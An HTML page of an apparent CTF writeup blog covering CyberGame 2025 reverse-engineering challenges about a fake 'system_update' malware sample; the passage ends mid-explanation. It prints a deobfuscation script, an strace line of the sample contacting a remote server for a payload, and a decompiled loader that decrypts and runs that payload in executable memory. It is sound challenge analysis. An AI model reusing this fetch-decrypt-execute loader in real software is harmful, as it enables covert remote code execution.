<!doctype html>







<html
  class="not-ready lg:text-base"
  style="--bg:#faf8f1"
  lang="en-us"
  dir="ltr"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>Cybergame 2025 Writeups - Stephenx0r - CTF Writeups</title>

  
  <meta name="theme-color" />

  <meta name="description" content="I took 1st place ðŸ¥‡ in CyberGame 2025, solving 71 out of 73 challenges and claiming 52 First bloods ðŸ©¸ along the way.

The game featured a wide variety of categories, including:


Web Exploitation &amp; Binary Exploitation


Forensics


OSINT (Open Source Intelligence)


Cryptography


Malware Analysis &amp; Reverse Engineering


Process and Governance


PyJails _(as part of the JAILE series)


Here are writeups for a few of the challenges I found particularly interesting." />
  <meta name="author" content="Stephenx0r - CTF Writeups" /><link rel="preload stylesheet" as="style" href="http://localhost:1313/main.min.css" />

  
  <link rel="preload" as="image" href="http://localhost:1313/theme.png" />

  

  <link rel="preload" as="image" href="http://localhost:1313/github.svg" /><link rel="preload" as="image" href="http://localhost:1313/linkedin.svg" />

  <script
    defer
    src="http://localhost:1313/highlight.min.js"
    onload="hljs.initHighlightingOnLoad();"
  ></script>

  
  <link
    rel="icon"
    href="http://localhost:1313/favicon.ico"
  />
  <link
    rel="apple-touch-icon"
    href="http://localhost:1313/apple-touch-icon.png"
  />

  <meta name="generator" content="Hugo 0.150.1">
</head>
<body
    class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"
  ><header
  class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"
>
  <div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto">
    <a
      class="-translate-y-[1px] text-2xl font-medium"
      href="http://localhost:1313/"
      >Stephenx0r - CTF Writeups</a
    >
    <div
      class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8"
    role="button"
    aria-label="Menu"
  ></div>

  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#faf8f1'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"
  ><nav
      class="mt-12 flex justify-center space-x-10 lg:mt-0 lg:items-center ltr:lg:ml-14 rtl:space-x-reverse rtl:lg:mr-14 dark:invert"
    >
      <a
        class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./github.svg)"
        href="https://github.com/Stephenx0r"
        target="_blank"
        rel="me"
      >github</a>
      <a
        class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./linkedin.svg)"
        href="https://linkedin.com/in/stephengathumbi"
        target="_blank"
        rel="me"
      >linkedin</a>
    </nav>
  </div>
</header>
<main
      class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"
    ><article>
  <header class="mb-14">
    <h1 class="my-0! pb-2.5">Cybergame 2025 Writeups</h1><div class="text-xs antialiased opacity-60"><time>Jun 11, 2025</time></div></header>

  <section><p>I took 1st place ðŸ¥‡ in CyberGame 2025, solving 71 out of 73 challenges and claiming 52 First bloods ðŸ©¸ along the way.
<img src="https://gist.github.com/user-attachments/assets/3dbb099e-da02-455a-b608-7952b96faad2" alt="image"></p>
<p>The game featured a wide variety of categories, including:</p>
<ul>
<li>
<p><strong>Web Exploitation &amp; Binary Exploitation</strong></p>
</li>
<li>
<p><strong>Forensics</strong></p>
</li>
<li>
<p><strong>OSINT (Open Source Intelligence)</strong></p>
</li>
<li>
<p><strong>Cryptography</strong></p>
</li>
<li>
<p><strong>Malware Analysis &amp; Reverse Engineering</strong></p>
</li>
<li>
<p><strong>Process and Governance</strong></p>
</li>
<li>
<p><strong>PyJails</strong> _(as part of the JAILE series)</p>
</li>
</ul>
<p>Here are writeups for a few of the challenges I found particularly interesting.</p>
<h2 id="-the-chronicles-of-greg">[â˜…â˜…â˜†] The Chronicles of Greg</h2>
<h3 id="systemupdate-incident-report">SystemUpdate incident report</h3>
<p>Description</p>
<blockquote>
<p>Greg didnâ€™t ask for this. Greg wanted a quiet Friday, maybe a donut, and ideally no malware. But no. Instead, Greg found logs weird logs. And when Greg sees weird logs, Greg investigates. This is Gregâ€™s story.</p></blockquote>
<p>############</p>
<p>Analyst Log â€“ 09:14 AM: &ldquo;They called it a &rsquo;low-priority anomaly.&rsquo; Said it was probably nothing. Thatâ€™s what they always<br>
say before things explode&rdquo;. I ran strings on the file didnâ€™t like what I saw. Not an update. Not even ransomware. Justâ€¦<br>
vibes. Binary vibes. Theyâ€™ve named it internally â€˜SystemUpdate.â€™ I donâ€™t know why. No update was done. Iâ€™m not even sure<br>
if this is about system update anymore.</p>
<p>############</p>
<h5 id="solution">Solution</h5>
<p>While reverse engineering the <code>system_update</code> binary, I focused on a suspicious subroutine <code>sub_20C0</code>. It stood out due to a sequence of unusual operations applied to a hardcoded array of bytes, suggesting some form of custom encoding or obfuscation logic.</p>
<p>Upon further inspection, I recognized a pattern of reversible transformations involving XORs, subtractions, and negations all acting on a 24-byte sequence. To decode this, I wrote a Python script to emulate the logic statically. The script essentially reverses three types of encoding operations: <code>chr = (key - (encoded_byte ^ 0x5C)) &amp; 0xFF</code>  ,  <code>chr = (- (encoded_byte ^ 0x5C)) &amp; 0xFF</code>   and   <code>chr = (encoded_byte ^ key) &amp; 0xFF</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s2">&#34;F9 FF 8F E0 EA C6 FE 2A CC 9D E6 9A 92 D3 C4 CB 20 E1 DF D7 95 E0 CC 2F&#34;</span><span class="o">.</span><span class="n">split</span><span class="p">()]</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="n">ops</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="kc">None</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">),</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">op</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">ops</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">target</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span> <span class="o">-</span> <span class="p">(</span><span class="n">t</span> <span class="o">^</span> <span class="mh">0x5C</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span> <span class="p">(</span><span class="n">t</span> <span class="o">^</span> <span class="mh">0x5C</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">t</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="c1"># verify</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="n">check</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="n">op</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">ops</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">o</span> <span class="o">=</span> <span class="p">((</span><span class="n">k</span> <span class="o">-</span> <span class="n">c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x5C</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">o</span> <span class="o">=</span> <span class="p">((</span><span class="o">-</span><span class="n">c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x5C</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">o</span> <span class="o">=</span> <span class="n">c</span> <span class="o">^</span> <span class="n">k</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="n">check</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">o</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="k">if</span> <span class="n">check</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ok&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;fail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="n">solve</span><span class="p">()</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SK-CERT{g3771ng_p4yl04d}
</span></span></code></pre></div><h3 id="the-blob-whisperer">The Blob Whisperer</h3>
<p>Description</p>
<blockquote>
<p>Analyst Log â€“ 12:47 PM: The blob showed up after SystemUpdate did its thing. Just a data. No extension. No metadata. No readme. No hope. The problem? There. Is. No. Key. Iâ€™ve tried dictionary attacks, rainbow tables, entropy analysis, even feeding it to a very confused intern. Nothingâ€¦ At one point, I shouted my Wi-Fi password at the screen out of raw frustration. Didnâ€™t help, but I felt better for two seconds. I thought I saw a familiar pattern in the entropy graph. Turns out it was just a coffee stain on my monitor. This isnâ€™t just encryption. This is a test of character. And Greg? Greg is not winning.</p></blockquote>
<p>Solution</p>
<p>When analyzing the <code>system_update</code> binary, I discovered that running it with a parameter causes it to connect to a remote server and transmit that input. If the provided value is incorrect, the server responds with a generic command like <code>COMMAND: apt update</code>.</p>
<p>To uncover the remote endpoint, I first ran <code>strings</code> on the binary, which revealed an embedded IP address. To confirm this and identify the port being used, I used <code>strace</code>, which clearly showed the binary establishing a connection to that address and port during execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">connect</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">{</span><span class="n">sa_family</span><span class="o">=</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">sin_port</span><span class="o">=</span><span class="n">htons</span><span class="p">(</span><span class="mi">7052</span><span class="p">),</span> <span class="n">sin_addr</span><span class="o">=</span><span class="n">inet_addr</span><span class="p">(</span><span class="s2">&#34;195.168.112.4&#34;</span><span class="p">)},</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
</span></span></code></pre></div><p>If the value is the  flag <code>SK-CERT{g3771ng_p4yl04d}</code> we got in the first part then it responds by sending an encrypted payload
<img src="https://gist.github.com/user-attachments/assets/0b6bf238-e7b6-450a-beb2-b0417f612c0c" alt="image"></p>
<p>Function <code>sub_1D20</code> does the decryption of the payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">sub_1D20</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="n">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="n">r14</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="n">eax</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="n">r14</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="nb">int</span> <span class="n">v6</span><span class="p">;</span> <span class="o">//</span> <span class="n">ebx</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="nb">int</span> <span class="n">v7</span><span class="p">;</span> <span class="o">//</span> <span class="n">ebx</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="n">void</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="n">v9</span><span class="p">)(</span><span class="n">void</span><span class="p">);</span> <span class="o">//</span> <span class="n">rax</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="nb">int</span> <span class="n">v11</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">105</span><span class="n">Ch</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="n">_BYTE</span> <span class="n">v12</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">1058</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="n">_BYTE</span> <span class="n">v13</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">1048</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="n">_BYTE</span> <span class="n">src</span><span class="p">[</span><span class="mi">4152</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">1038</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">sub_1C30</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="n">srand</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="n">do</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="n">v12</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">v13</span><span class="p">[</span><span class="n">v2</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">!=</span> <span class="mi">16</span> <span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">EVP_aes_128_cbc</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v12</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">  <span class="n">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v11</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src</span><span class="p">[</span><span class="n">v11</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">v11</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">+</span> <span class="n">v6</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">      <span class="n">src</span><span class="p">[</span><span class="n">v7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="n">a2</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">!=</span> <span class="p">(</span><span class="n">void</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="n">LL</span> <span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="n">void</span><span class="p">))</span><span class="n">memcpy</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="n">v9</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">      <span class="n">perror</span><span class="p">(</span><span class="s2">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The key used for encryption in the <code>system_update</code> binary is generated using <code>rand()</code>, which is seeded via <code>srand()</code> with a value derived from the major and minor version of the current <code>libc</code>.</p>
<p>During analysis, I noticed that the first 5 bytes of the payload are discarded before encryption. After removing these bytes from the captured payload, I brute-forced potential seeds using a small C script that simulated the encryption process based on different <code>libc</code> versions. This led me to discover that version <strong>2.38</strong> was the correct one used to seed the random number generator.</p>
<p>To retrieve the payload, I saved the encrypted data using:</p>
